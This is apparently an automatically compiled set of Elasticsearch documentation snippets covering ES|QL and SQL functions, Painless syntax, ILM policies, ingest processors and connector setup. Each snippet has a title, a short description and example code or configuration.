    "language": "SOQL"
  }
]

LANGUAGE: js
CODE:
[
  {
    "query": "FIND {Salesforce} IN ALL FIELDS",
    "language": "SOSL"
  }
]

LANGUAGE: js
CODE:
[
  {
    "query": "SELECT Account_Id, Address, Contact_Number FROM Account",
    "language": "SOQL"
  },
  {
    "query": "FIND {Alex Wilber} IN ALL FIELDS RETURNING Contact(LastModifiedDate, Name, Address)",
    "language": "SOSL"
  }
]

LANGUAGE: js
CODE:
[
  {
    "query": "SELECT Connector_Name, Version FROM Connector__c",
    "language": "SOQL"
  },
  {
    "query": "FIND {Salesforce} IN ALL FIELDS RETURNING Connectors__c(Id, Connector_Name, Connector_Version)",
    "language": "SOSL"
  }
]

LANGUAGE: js
CODE:
[
  {
    "query": "SELECT FIELDS(ALL) FROM Account",
    "language": "SOQL"
  }
]

LANGUAGE: js
CODE:
[
  {
    "query": "SELECT FIELDS(CUSTOM) FROM Connector__c",
    "language": "SOQL"
  }
]

LANGUAGE: js
CODE:
[
  {
    "query": "SELECT FIELDS(STANDARD) FROM Account",
    "language": "SOQL"
  }
]

----------------------------------------

TITLE: Including MV_MEDIAN Function Examples in Markdown
DESCRIPTION: This snippet includes usage examples for the MV_MEDIAN function from an external file.

LANGUAGE: markdown
CODE:
:::{include} ../examples/mv_median.md
:::

----------------------------------------

TITLE: Advanced Sync Rule: Overlapping Rules
DESCRIPTION: Example of advanced sync rules for the GitHub connector demonstrating overlapping rules for indexing merged pull requests with specific labels and date ranges.

LANGUAGE: json
CODE:
[
  {
    "filter": {
      "pr": "is:pr is:merged label:auto-backport merged:>=2023-07-20"
    },
    "repository": "repo_name"
  },
  {
    "filter": {
      "pr": "is:pr is:merged label:auto-backport merged:>=2023-07-15"
    },
    "repository": "repo_name"
  }
]

----------------------------------------

TITLE: Indexing a Polygon shape in WKT format
DESCRIPTION: Example of indexing a polygon shape using the Well-Known Text (WKT) format in Elasticsearch. Polygons are defined by a list of points, where the first and last points must be the same to close the polygon.

LANGUAGE: console
CODE:
POST /example/_doc
{
  "location" : "POLYGON ((1000.0 -1001.0, 1001.0 -1001.0, 1001.0 -1000.0, 1000.0 -1000.0, 1000.0 -1001.0))"
}

----------------------------------------

TITLE: Calculating Hypotenuse using HYPOT in ESQL
DESCRIPTION: Demonstrates how to use the HYPOT function to calculate the length of a hypotenuse given two sides of a right triangle. In this example, it calculates the hypotenuse of a right triangle with sides 3.0 and 4.0, resulting in 5.0.

LANGUAGE: esql
CODE:
ROW a = 3.0, b = 4.0
| EVAL c = HYPOT(a, b)

----------------------------------------

TITLE: SELECT with LIMIT Clause
DESCRIPTION: Illustrates the usage of LIMIT clause to restrict the number of rows returned in Elasticsearch SQL.

LANGUAGE: sql
CODE:
SELECT first_name, last_name, emp_no FROM emp LIMIT 1;

----------------------------------------

TITLE: Defining Inner Pipeline in Elasticsearch
DESCRIPTION: Creates an inner pipeline named 'pipelineA' that sets a field value using the set processor.

LANGUAGE: console
CODE:
PUT _ingest/pipeline/pipelineA
{
  "description" : "inner pipeline",
  "processors" : [
    {
      "set" : {
        "field": "inner_pipeline_set",
        "value": "inner"
      }
    }
  ]
}

----------------------------------------

TITLE: Configuring ILM Health Settings in Elasticsearch
DESCRIPTION: Dynamic cluster settings for Index Lifecycle Management (ILM) health monitoring, including timeouts and retry thresholds for actions and steps.

LANGUAGE: properties
CODE:
health.ilm.max_time_on_action: 1d
health.ilm.max_time_on_step: 1d
health.ilm.max_retries_per_step: 100

----------------------------------------

TITLE: Using SIGNUM Function in Elasticsearch SQL
DESCRIPTION: Example demonstrating how to use the SIGNUM function which returns -1 for negative numbers, 0 for zero, and 1 for positive numbers. The example shows applying SIGNUM to a decimal value using ROW and EVAL commands.

LANGUAGE: sql
CODE:
ROW d = 100.0
| EVAL s = SIGNUM(d)

----------------------------------------

TITLE: Single-line Comments Example in Painless
DESCRIPTION: Demonstrates the usage of single-line comments in Painless scripts using the // token, showing comments both on separate lines and at the end of code lines.

LANGUAGE: painless
CODE:
// single-line comment

int value; // single-line comment

----------------------------------------

TITLE: Querying Geometries with ST_WITHIN in Elasticsearch ESQL
DESCRIPTION: This query demonstrates the use of the ST_WITHIN function to filter airport city boundaries that are within a specified polygon. It also uses the TO_GEOSHAPE function to convert a WKT (Well-Known Text) representation of a polygon into a geometry object.

LANGUAGE: sql
CODE:
FROM airport_city_boundaries
| WHERE ST_WITHIN(city_boundary, TO_GEOSHAPE("POLYGON((109.1 18.15, 109.6 18.15, 109.6 18.65, 109.1 18.65, 109.1 18.15))"))
| KEEP abbrev, airport, region, city, city_location

----------------------------------------

TITLE: Querying Geometries with ST_WITHIN in Elasticsearch ESQL
DESCRIPTION: This query demonstrates the use of the ST_WITHIN function to filter airport city boundaries that are within a specified polygon. It also uses the TO_GEOSHAPE function to convert a WKT (Well-Known Text) representation of a polygon into a geometry object.

LANGUAGE: sql
CODE:
FROM airport_city_boundaries
| WHERE ST_WITHIN(city_boundary, TO_GEOSHAPE("POLYGON((109.1 18.15, 109.6 18.15, 109.6 18.65, 109.1 18.65, 109.1 18.15))"))
| KEEP abbrev, airport, region, city, city_location

----------------------------------------

TITLE: Using Cast Operator in Elasticsearch SQL
DESCRIPTION: Demonstrates the usage of the double colon (::) cast operator to convert a string value to a long integer type. This is an alternative to using the CAST function.

LANGUAGE: sql
CODE:
SELECT '123'::long AS long;

----------------------------------------

TITLE: Simulating Redact Processor with Custom Pattern in Elasticsearch
DESCRIPTION: This example illustrates how to define and use a custom Grok pattern with the Redact processor. It creates a 'GITHUB_NAME' pattern to match and redact GitHub usernames.

LANGUAGE: json
CODE:
POST _ingest/pipeline/_simulate
{
  "pipeline": {
    "processors": [
      {
        "redact": {
          "field": "message",
          "patterns": [
            "%{GITHUB_NAME:GITHUB_NAME}"
          ],
          "pattern_definitions": {
            "GITHUB_NAME": "@%{USERNAME}"
          }
        }
      }
    ]
  },
  "docs": [
    {
      "_source": {
        "message": "@elastic-data-management the PR is ready for review"
      }
    }
  ]
}

----------------------------------------

TITLE: Security Exception Example in Elasticsearch Reroute Processor
DESCRIPTION: Example of a security exception message when the client lacks necessary permissions to perform rerouting operations.

LANGUAGE: javascript
CODE:
{"type":"security_exception","reason":"action [indices:admin/auto_create] is unauthorized for API key id [8-dt9H8BqGblnY2uSI--] of user [elastic/fleet-server] on indices [logs-foo-default], this action is granted by the index privileges [auto_configure,create_index,manage,all]"}

----------------------------------------

TITLE: Using LTRIM in ESQL Query
DESCRIPTION: Demonstrates how to use the LTRIM function to remove leading whitespace from strings in an ESQL query. The example shows trimming leading spaces from two different string values and wrapping them in single quotes using CONCAT for visualization.

LANGUAGE: sql
CODE:
ROW message = "   some text  ",  color = " red "
| EVAL message = LTRIM(message)
| EVAL color = LTRIM(color)
| EVAL message = CONCAT("'", message, "'")
| EVAL color = CONCAT("'", color, "'")

----------------------------------------

TITLE: Boolean Logic Operators in Painless
DESCRIPTION: Shows boolean AND (&&), OR (||) and XOR (^) operators with truth tables and examples using both boolean and def types.

LANGUAGE: painless
CODE:
boolean x = false;
boolean y = x ^ true;
y = y ^ x;

LANGUAGE: painless
CODE:
boolean x = true;
boolean y = x && true;
x = false;
y = y && x;

LANGUAGE: painless
CODE:
boolean x = false;
boolean y = x || true;
y = false;
y = y || x;

----------------------------------------

TITLE: Using GREATEST Function in ESQL Query
DESCRIPTION: This snippet demonstrates how to use the GREATEST function in an ESQL query to find the maximum value between two columns. It creates a row with two values and then applies the GREATEST function to determine the larger value.

LANGUAGE: sql
CODE:
ROW a = 10, b = 20
| EVAL g = GREATEST(a, b)

----------------------------------------

TITLE: Running Connector Docker Container
DESCRIPTION: Shell command to run the Notion connector Docker container

LANGUAGE: shell
CODE:
docker run \
-v ~/connectors-config:/config \
--network "elastic" \
--tty \
--rm \
docker.elastic.co/integrations/elastic-connectors:9.0.0 \
/app/bin/elastic-ingest \
-c /config/config.yml

----------------------------------------

TITLE: Combining Node Assignment and Replica Settings
DESCRIPTION: Shows how to create an ILM policy that both updates replica count and assigns indices to specific nodes based on box_type during the warm phase.

LANGUAGE: json
CODE:
PUT _ilm/policy/my_policy
{
  "policy": {
    "phases": {
      "warm": {
        "actions": {
          "allocate" : {
            "number_of_replicas": 1,
            "require" : {
              "box_type": "cold"
            }
        }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Converting Various Types to Long Using TO_LONG Function in ESQL
DESCRIPTION: This snippet demonstrates the usage of the TO_LONG function in ESQL to convert string representations of numbers, including decimals, to long values. It also shows how the function handles invalid input.

LANGUAGE: sql
CODE:
ROW str1 = "2147483648", str2 = "2147483648.2", str3 = "foo"
| EVAL long1 = TO_LONG(str1), long2 = TO_LONG(str2), long3 = TO_LONG(str3)

----------------------------------------

TITLE: Removing Smart Chinese Analysis Plugin from Elasticsearch
DESCRIPTION: Command to remove the Smart Chinese Analysis plugin from Elasticsearch. The node must be stopped before removing the plugin.

LANGUAGE: sh
CODE:
sudo bin/elasticsearch-plugin remove analysis-smartcn

----------------------------------------

TITLE: Downloading Google Drive Connector Configuration File
DESCRIPTION: Command to download the sample configuration file for the Google Drive connector using curl.

LANGUAGE: sh
CODE:
curl https://raw.githubusercontent.com/elastic/connectors/main/config.yml.example --output ~/connectors-config/config.yml

----------------------------------------

TITLE: Including ST_ENVELOPE Function Type Information in Markdown
DESCRIPTION: This snippet includes the type information for the ST_ENVELOPE function from an external Markdown file.

LANGUAGE: markdown
CODE:
:::{include} ../types/st_envelope.md
:::

----------------------------------------

TITLE: Including REPEAT Function Examples in Markdown
DESCRIPTION: This snippet includes the content of a separate Markdown file containing usage examples for the REPEAT function.

LANGUAGE: markdown
CODE:
:::{include} ../examples/repeat.md
:::

----------------------------------------

TITLE: Documenting TO_DATE_NANOS Function in Elasticsearch ESQL
DESCRIPTION: This snippet provides documentation for the TO_DATE_NANOS function in Elasticsearch's ESQL. It explains the function's purpose of converting input to a nanosecond-resolution date value, and specifies the valid date range and limitations for integer conversions.

LANGUAGE: markdown
CODE:
### TO_DATE_NANOS
Converts an input to a nanosecond-resolution date value (aka date_nanos).

Note: The range for date nanos is 1970-01-01T00:00:00.000000000Z to 2262-04-11T23:47:16.854775807Z, attepting to convertvalues outside of that range will result in null with a warning..  Additionally, integers cannot be converted into date nanos, as the range of integer nanoseconds only covers about 2 seconds after epoch.

----------------------------------------

TITLE: Retrieving Array Length in Painless
DESCRIPTION: Explains how to access the read-only 'length' field of an array, which stores the size of the array as an int value. The field access operator is used to retrieve the length.

LANGUAGE: painless
CODE:
int[] x = new int[10];
int l = x.length;

----------------------------------------

TITLE: Date Histogram with Time Zone and Formatting
DESCRIPTION: Example demonstrating time zone handling and date formatting in date histogram aggregations.

LANGUAGE: console
CODE:
GET my-index-000001/_search?size=0
{
  "aggs": {
    "by_day": {
      "date_histogram": {
        "field": "date",
        "calendar_interval": "day",
        "time_zone": "-01:00"
      }
    }
  }
}

----------------------------------------

TITLE: Defining Parameters for ESQL Interval Function Test
DESCRIPTION: Specifies two parameters: 'interval' using timespan literal syntax, and 'date' as a date expression. This documentation is likely used for generating test cases or API documentation for an Elasticsearch SQL function.

LANGUAGE: markdown
CODE:
**Parameters**

`interval`
:   Interval; expressed using the timespan literal syntax.

`date`
:   Date expression

----------------------------------------

TITLE: Creating Outlook Connector via API
DESCRIPTION: API request to create a new Outlook connector instance in Elasticsearch

LANGUAGE: console
CODE:
PUT _connector/my-outlook-connector
{
  "index_name": "my-elasticsearch-index",
  "name": "Content synced from Outlook",
  "service_type": "outlook"
}

----------------------------------------

TITLE: Range Query for Unsigned Long in Elasticsearch
DESCRIPTION: This snippet shows a range query for unsigned long values, demonstrating the recommended practice of using string representations for large numbers.

LANGUAGE: console
CODE:
GET /my_index/_search
{
    "query": {
        "range" : {
            "my_counter" : {
                "gte" : "9223372036854775808",
                "lte" : "18446744073709551615"
            }
        }
    }
}

----------------------------------------

TITLE: Creating API Key for S3 Connector
DESCRIPTION: API request example for generating an API key with required permissions for the S3 connector.

LANGUAGE: console
CODE:
POST /_security/api_key
{
  "name": "connector_name-connector-api-key",
  "role_descriptors": {
    "connector_name-connector-role": {
      "cluster": [
        "monitor",
        "manage_connector"
      ],
      "indices": [
        {
          "names": [
            "index_name",
            ".search-acl-filter-index_name",
            ".elastic-connectors*"
          ],
          "privileges": [
            "all"
          ],
          "allow_restricted_indices": false
        }
      ]
    }
  }
}

----------------------------------------

TITLE: Creating Elasticsearch Connector
DESCRIPTION: This API call creates a PostgreSQL connector instance in Elasticsearch using the Create connector API.

LANGUAGE: json
CODE:
PUT _connector/my-connector-id
{
  "name": "Music catalog",
  "index_name":  "music",
  "service_type": "postgresql"
}

----------------------------------------

TITLE: Including PI Function Documentation Sections in Markdown
DESCRIPTION: These snippets include external Markdown files for parameters, description, types, and examples of the PI function.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/pi.md
:::

LANGUAGE: markdown
CODE:
:::{include} ../description/pi.md
:::

LANGUAGE: markdown
CODE:
:::{include} ../types/pi.md
:::

LANGUAGE: markdown
CODE:
:::{include} ../examples/pi.md
:::

----------------------------------------

TITLE: Rounding Up with CEIL Function in ESQL
DESCRIPTION: This snippet demonstrates the use of the CEIL function in ESQL to round up a decimal number. It creates a row with a decimal value and then applies the CEIL function to round it up to the nearest integer.

LANGUAGE: esql
CODE:
ROW a=1.8
| EVAL a=CEIL(a)

----------------------------------------

TITLE: Using REPEAT Function in Elasticsearch SQL
DESCRIPTION: Returns a string composed of the input string repeated a specified number of times. The resulting string cannot exceed 1 MB in byte length.

LANGUAGE: sql
CODE:
SELECT REPEAT('La', 3);

 REPEAT('La', 3)
----------------
LaLaLa

----------------------------------------

TITLE: Importing ST_YMAX Function Documentation in Markdown
DESCRIPTION: This snippet demonstrates the structure of the ST_YMAX function documentation, including references to external files for parameters, description, types, and examples.

LANGUAGE: markdown
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

## `ST_YMAX` [esql-st_ymax]

**Syntax**

:::{image} ../../../images/functions/st_ymax.svg
:alt: Embedded
:class: text-center
:::


:::{include} ../parameters/st_ymax.md
:::

:::{include} ../description/st_ymax.md
:::

:::{include} ../types/st_ymax.md
:::

:::{include} ../examples/st_ymax.md
:::

----------------------------------------

TITLE: Defining String Literals with Single Quotes in Painless
DESCRIPTION: Examples of string literal syntax using single quotes in Painless. Demonstrates escaping single quotes and backslashes within the string.

LANGUAGE: painless
CODE:
'single-quoted string literal'
'\'single-quoted with escaped single-quotes\' and backslash \\'
'single-quoted with non-escaped "double-quotes"'

----------------------------------------

TITLE: Using Stored Scripts for Scripted Metric Aggregation
DESCRIPTION: This example shows how to use stored scripts for the scripted metric aggregation. It references pre-defined scripts by their IDs and passes parameters through a global params object.

LANGUAGE: console
CODE:
POST ledger/_search?size=0
{
  "aggs": {
    "profit": {
      "scripted_metric": {
        "init_script": {
          "id": "my_init_script"
        },
        "map_script": {
          "id": "my_map_script"
        },
        "combine_script": {
          "id": "my_combine_script"
        },
        "params": {
          "field": "amount"
        },
        "reduce_script": {
          "id": "my_reduce_script"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Date Histogram Value Rounding Logic
DESCRIPTION: Java code showing how bucket keys are calculated for date histogram aggregations.

LANGUAGE: java
CODE:
bucket_key = Math.floor(value / interval) * interval

----------------------------------------

TITLE: Supported TIME Data Type Usage with Scalar Function in GROUP BY
DESCRIPTION: Shows a supported query where the TIME data type is wrapped with a scalar function in the GROUP BY clause.

LANGUAGE: sql
CODE:
SELECT count(*) FROM test GROUP BY MINUTE((CAST(date_created AS TIME));

----------------------------------------

TITLE: Configuring Custom MinHash and Shingle Filters in Elasticsearch
DESCRIPTION: This snippet demonstrates how to create a custom analyzer using MinHash and Shingle filters in Elasticsearch. It configures custom token filters and applies them to a specific field mapping.

LANGUAGE: JSON
CODE:
{
  "settings": {
    "analysis": {
      "filter": {
        "my_shingle_filter": {
          "type": "shingle",
          "min_shingle_size": 5,
          "max_shingle_size": 5,
          "output_unigrams": false
        },
        "my_minhash_filter": {
          "type": "min_hash",
          "hash_count": 1,
          "bucket_count": 512,
          "hash_set_size": 1,
          "with_rotation": true
        }
      },
      "analyzer": {
        "my_analyzer": {
          "tokenizer": "standard",
          "filter": [
            "my_shingle_filter",
            "my_minhash_filter"
          ]
        }
      }
    }
  },
  "mappings": {
    "properties": {
      "fingerprint": {
        "type": "text",
        "analyzer": "my_analyzer"
      }
    }
  }
}

----------------------------------------

TITLE: Setting JVM Options via Environment Variables
DESCRIPTION: Example of setting JVM options through the ES_JAVA_OPTS environment variable for development environments.

LANGUAGE: shell
CODE:
export ES_JAVA_OPTS="$ES_JAVA_OPTS -Djava.io.tmpdir=/path/to/temp/dir"
./bin/elasticsearch

----------------------------------------

TITLE: Sample Configuration for Self-Managed Connector
DESCRIPTION: Example of a configuration file for deploying the SharePoint Server connector as a self-managed connector using Docker.

LANGUAGE: yaml
CODE:
elasticsearch.host: http://host.docker.internal:9200
elasticsearch.api_key: <ELASTICSEARCH_API_KEY>

connectors:
  -
    connector_id: <CONNECTOR_ID_FROM_KIBANA>
    service_type: sharepoint_server
    api_key: <CONNECTOR_API_KEY_FROM_KIBANA> # Optional. If not provided, the connector will use the elasticsearch.api_key instead

----------------------------------------

TITLE: Geo Point Mapping Definition
DESCRIPTION: Example showing how to define mapping for the geoip location field as a geo_point type for geospatial queries.

LANGUAGE: console
CODE:
PUT my_ip_locations
{
  "mappings": {
    "properties": {
      "geoip": {
        "properties": {
          "location": { "type": "geo_point" }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Creating Notion Connector via Elasticsearch API
DESCRIPTION: API call to create a new Notion connector instance with basic configuration

LANGUAGE: json
CODE:
PUT _connector/my-notion-connector
{
  "index_name": "my-elasticsearch-index",
  "name": "Content synced from Notion",
  "service_type": "notion"
}

----------------------------------------

TITLE: Using REVERSE Function in Elasticsearch SQL
DESCRIPTION: Demonstrates how to use the REVERSE function to reverse the characters in a string field. The example shows reversing a message field containing 'Some Text' using the EVAL clause.

LANGUAGE: sql
CODE:
ROW message = "Some Text" | EVAL message_reversed = REVERSE(message);

----------------------------------------

TITLE: Indexing a MultiPolygon shape in GeoJSON format
DESCRIPTION: Example of indexing a multipolygon shape using the GeoJSON format in Elasticsearch. MultiPolygons are represented as an array of polygon coordinates, where the second polygon contains a hole.

LANGUAGE: console
CODE:
POST /example/_doc
{
  "location" : {
    "type" : "multipolygon",
    "coordinates" : [
      [ [[1002.0, 200.0], [1003.0, 200.0], [1003.0, 300.0], [1002.0, 300.0], [1002.0, 200.0]] ],
      [ [[1000.0, 200.0], [1001.0, 100.0], [1001.0, 100.0], [1000.0, 100.0], [1000.0, 100.0]],
        [[1000.2, 200.2], [1000.8, 100.2], [1000.8, 100.8], [1000.2, 100.8], [1000.2, 100.2]] ]
    ]
  }
}

----------------------------------------

TITLE: Using NOT_LIKE Pattern Matching in Elasticsearch SQL
DESCRIPTION: Documentation of wildcard characters supported in NOT_LIKE pattern matching. The operator supports '*' for matching zero or more characters and '?' for matching exactly one character. Can be used with fields or literal expressions on the left-hand side.

LANGUAGE: markdown
CODE:
* `*` matches zero or more characters.
* `?` matches one character.

----------------------------------------

TITLE: Viewing Slow Log Example for Indexing Event in Elasticsearch
DESCRIPTION: This snippet demonstrates the format of an indexing event in the Elasticsearch slow log. It includes information such as timestamp, cluster details, index name, and execution time.

LANGUAGE: json
CODE:
{
  "@timestamp" : "2024-12-11T22:34:22.613Z",
  "auth.type": "REALM",
  "ecs.version": "1.2.0",
  "elasticsearch.cluster.name" : "41bd111609d849fc9bf9d25b5df9ce96",
  "elasticsearch.cluster.uuid" : "BZTn4I9URXSK26imlia0QA",
  "elasticsearch.index.id" : "3VfGR7wRRRKmMCEn7Ii58g",
  "elasticsearch.index.name": "my-index-000001",
  "elasticsearch.node.id" : "GGiBgg21S3eqPDHzQiCMvQ",
  "elasticsearch.node.name" : "instance-0000000001",
  "elasticsearch.slowlog.id" : "RCHbt5MBT0oSsCOu54AJ",
  "elasticsearch.slowlog.source": "{\"key\":\"value\"}"
  "elasticsearch.slowlog.took" : "0.01ms",
  "event.dataset": "elasticsearch.index_indexing_slowlog",
  "fileset.name" : "slowlog",
  "log.level" : "TRACE",
  "log.logger" : "index.indexing.slowlog.index",
  "service.name" : "ES_ECS",
  "user.name": "elastic",
  "user.realm": "reserved"
}

----------------------------------------

TITLE: Semantic Text Index with Separate Ingest and Search Endpoints
DESCRIPTION: Creates an index with separate inference endpoints for ingestion and search operations.

LANGUAGE: console
CODE:
PUT my-index-000003
{
  "mappings": {
    "properties": {
      "inference_field": {
        "type": "semantic_text",
        "inference_id": "my-elser-endpoint-for-ingest",
        "search_inference_id": "my-elser-endpoint-for-search"
      }
    }
  }
}

----------------------------------------

TITLE: Semantic Text Index with Separate Ingest and Search Endpoints
DESCRIPTION: Creates an index with separate inference endpoints for ingestion and search operations.

LANGUAGE: console
CODE:
PUT my-index-000003
{
  "mappings": {
    "properties": {
      "inference_field": {
        "type": "semantic_text",
        "inference_id": "my-elser-endpoint-for-ingest",
        "search_inference_id": "my-elser-endpoint-for-search"
      }
    }
  }
}

----------------------------------------

TITLE: Semantic Text Index with Separate Ingest and Search Endpoints
DESCRIPTION: Creates an index with separate inference endpoints for ingestion and search operations.

LANGUAGE: console
CODE:
PUT my-index-000003
{
  "mappings": {
    "properties": {
      "inference_field": {
        "type": "semantic_text",
        "inference_id": "my-elser-endpoint-for-ingest",
        "search_inference_id": "my-elser-endpoint-for-search"
      }
    }
  }
}

----------------------------------------

TITLE: Calculating String Lengths with ESQL
DESCRIPTION: Query that filters airports in India and calculates both character length and bit length of city names using LENGTH() and BIT_LENGTH() functions. Shows how to combine WHERE filtering, KEEP column selection, and EVAL for computed columns.

LANGUAGE: esql
CODE:
FROM airports
| WHERE country == "India"
| KEEP city
| EVAL fn_length = LENGTH(city), fn_bit_length = BIT_LENGTH(city)

----------------------------------------

TITLE: Unsupported Complex Aggregations in ORDER BY Clause
DESCRIPTION: Illustrates examples of unsupported queries using complex aggregations or scalar functions in the ORDER BY clause when grouping.

LANGUAGE: sql
CODE:
SELECT age, ROUND(AVG(salary)) AS avg FROM test GROUP BY age ORDER BY avg;

LANGUAGE: sql
CODE:
SELECT age, MAX(salary) - MIN(salary) AS diff FROM test GROUP BY age ORDER BY diff;

----------------------------------------

TITLE: Docker Deployment Sample Configuration
DESCRIPTION: Example YAML configuration for deploying the Jira connector using Docker

LANGUAGE: yaml
CODE:
elasticsearch.host: http://host.docker.internal:9200
elasticsearch.api_key: <ELASTICSEARCH_API_KEY>

connectors:
  -
    connector_id: <CONNECTOR_ID_FROM_KIBANA>
    service_type: jira
    api_key: <CONNECTOR_API_KEY_FROM_KIBANA>

----------------------------------------

TITLE: Fallback Configuration in Elasticsearch Reroute Processor
DESCRIPTION: Example showing how to configure fallback values for dataset and namespace options in the reroute processor.

LANGUAGE: javascript
CODE:
{
  "reroute": {
    "dataset": [
        "{{service.name}}",
        "generic"
    ],
    "namespace": "default"
  }
}

----------------------------------------

TITLE: Using EXP Function in ESQL
DESCRIPTION: Demonstrates how to use the EXP function to calculate e raised to a power in ESQL. Takes a numeric value as input and returns e (Euler's number) raised to that power.

LANGUAGE: sql
CODE:
ROW d = 5.0
| EVAL s = EXP(d)

----------------------------------------

TITLE: Using VALUES Function with ESQL
DESCRIPTION: Demonstrates how to use the VALUES function to collect all first names grouped by their first letter. The example includes sorting the results and using MV_SORT to order the collected values.

LANGUAGE: sql
CODE:
  FROM employees
| EVAL first_letter = SUBSTRING(first_name, 0, 1)
| STATS first_name=MV_SORT(VALUES(first_name)) BY first_letter
| SORT first_letter

----------------------------------------

TITLE: Advanced Sync Rule: Branch-Based Indexing
DESCRIPTION: Example of an advanced sync rule for the GitHub connector that indexes documents and files based on a specific branch name.

LANGUAGE: json
CODE:
[
  {
    "repository": "repo_name",
    "filter": {
      "branch": "sync-rules-feature"
    }
  }
]

----------------------------------------

TITLE: Rollover Based on Primary Shard Size
DESCRIPTION: ILM policy configuration that triggers rollover when the largest primary shard reaches 50GB.

LANGUAGE: json
CODE:
PUT _ilm/policy/my_policy
{
  "policy": {
    "phases": {
      "hot": {
        "actions": {
          "rollover" : {
            "max_primary_shard_size": "50gb"
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Nori Number Analysis Results
DESCRIPTION: Example output showing the normalized tokens produced by the nori_number filter, demonstrating the conversion of Korean numbers to Arabic decimals.

LANGUAGE: console-result
CODE:
{
  "tokens" : [{
    "token" : "102500",
    "start_offset" : 0,
    "end_offset" : 6,
    "type" : "word",
    "position" : 0
  }, {
    "token" : "과",
    "start_offset" : 6,
    "end_offset" : 7,
    "type" : "word",
    "position" : 1
  }, {
    "token" : "3200",
    "start_offset" : 8,
    "end_offset" : 12,
    "type" : "word",
    "position" : 2
  }]
}

----------------------------------------

TITLE: Auto-interval Date Histogram with Custom Format in Elasticsearch
DESCRIPTION: Demonstrates using a custom date format ('yyyy-MM-dd') in the auto_date_histogram aggregation with 5 target buckets.

LANGUAGE: console
CODE:
POST /sales/_search?size=0
{
  "aggs": {
    "sales_over_time": {
      "auto_date_histogram": {
        "field": "date",
        "buckets": 5,
        "format": "yyyy-MM-dd"
      }
    }
  }
}

----------------------------------------

TITLE: Including DATE_DIFF Function Examples in Markdown
DESCRIPTION: This snippet includes the content of a separate Markdown file containing usage examples for the DATE_DIFF function.

LANGUAGE: markdown
CODE:
:::{include} ../examples/date_diff.md
:::

----------------------------------------

TITLE: Input Document for URI Parts Processing in Elasticsearch
DESCRIPTION: Sample input document containing a URI string to be processed by the URI parts processor in Elasticsearch.

LANGUAGE: json
CODE:
{
  "_source": {
    "input_field": "http://myusername:mypassword@www.example.com:80/foo.gif?key1=val1&key2=val2#fragment"
  }
}

----------------------------------------

TITLE: Internal Representation of Indexed JSON Document in Elasticsearch
DESCRIPTION: Shows the flattened key-value pair representation of the hierarchical JSON document as it is indexed internally in Elasticsearch.

LANGUAGE: js
CODE:
{
  "region":             "US",
  "manager.age":        30,
  "manager.name.first": "John",
  "manager.name.last":  "Smith"
}

----------------------------------------

TITLE: Retrieving Euler's Number with E() Function in ESQL
DESCRIPTION: Demonstrates how to use the E() function to get the mathematical constant e (Euler's number) with a precision of 15 decimal places. Returns 2.718281828459045 as a double value.

LANGUAGE: esql
CODE:
ROW E()

----------------------------------------

TITLE: Requesting REST API Compatibility Headers in HTTP
DESCRIPTION: Example of HTTP headers used to request REST API compatibility in Elasticsearch. The Accept header is always required, while Content-Type is only needed when sending a request body.

LANGUAGE: text
CODE:
Accept: "application/vnd.elasticsearch+json;compatible-with=8"
Content-Type: "application/vnd.elasticsearch+json;compatible-with=8"

----------------------------------------

TITLE: Updating Search Slow Log Settings for a Single Index in Elasticsearch
DESCRIPTION: This JSON snippet demonstrates how to adjust search slow log settings for a single index using the update indices settings API in Elasticsearch. It configures thresholds for different log levels and includes user information.

LANGUAGE: json
CODE:
PUT /my-index-000001/_settings
{
  "index.search.slowlog.threshold.query.warn": "10s",
  "index.search.slowlog.threshold.query.info": "5s",
  "index.search.slowlog.threshold.query.debug": "2s",
  "index.search.slowlog.threshold.query.trace": "500ms",
  "index.search.slowlog.threshold.fetch.warn": "1s",
  "index.search.slowlog.threshold.fetch.info": "800ms",
  "index.search.slowlog.threshold.fetch.debug": "500ms",
  "index.search.slowlog.threshold.fetch.trace": "200ms",
  "index.search.slowlog.include.user": true
}

----------------------------------------

TITLE: Running ServiceNow Connector Docker Container
DESCRIPTION: Shell command to run the connector service Docker container

LANGUAGE: shell
CODE:
docker run \
-v ~/connectors-config:/config \
--network "elastic" \
--tty \
--rm \
docker.elastic.co/integrations/elastic-connectors:9.0.0 \
/app/bin/elastic-ingest \
-c /config/config.yml

----------------------------------------

TITLE: Docker Configuration for Zoom Connector
DESCRIPTION: YAML configuration example for deploying Zoom connector with Docker

LANGUAGE: yaml
CODE:
elasticsearch.host: http://host.docker.internal:9200
elasticsearch.api_key: <ELASTICSEARCH_API_KEY>

connectors:
  -
    connector_id: <CONNECTOR_ID_FROM_KIBANA>
    service_type: zoom
    api_key: <CONNECTOR_API_KEY_FROM_KIBANA>

----------------------------------------

TITLE: Filtered Nested Aggregation Query
DESCRIPTION: Executes a nested aggregation with a filter to find the minimum price for a specific reseller.

LANGUAGE: console
CODE:
GET /products/_search?size=0
{
  "query": {
    "match": {
      "name": "led tv"
    }
  },
  "aggs": {
    "resellers": {
      "nested": {
        "path": "resellers"
      },
      "aggs": {
        "filter_reseller": {
          "filter": {
            "bool": {
              "filter": [
                {
                  "term": {
                    "resellers.reseller": "companyB"
                  }
                }
              ]
            }
          },
          "aggs": {
            "min_price": {
              "min": {
                "field": "resellers.price"
              }
            }
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Querying City Lengths with ESQL
DESCRIPTION: Query that filters airports in India and calculates both character length and byte length of city names. The example shows how LENGTH returns character count while BYTE_LENGTH returns the actual bytes used to store the string, which can differ for non-ASCII characters.

LANGUAGE: esql
CODE:
FROM airports
| WHERE country == "India"
| KEEP city
| EVAL fn_length = LENGTH(city), fn_byte_length = BYTE_LENGTH(city)

----------------------------------------

TITLE: Including SIN Function Documentation Sections in Markdown
DESCRIPTION: This snippet demonstrates how to include various documentation sections for the SIN function using Markdown include directives.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/sin.md
:::

:::{include} ../description/sin.md
:::

:::{include} ../types/sin.md
:::

:::{include} ../examples/sin.md
:::

----------------------------------------

TITLE: Including ST_CENTROID_AGG Function Documentation Sections in Markdown
DESCRIPTION: This snippet demonstrates how to include various documentation sections for the ST_CENTROID_AGG function using Markdown includes.

LANGUAGE: markdown
CODE:
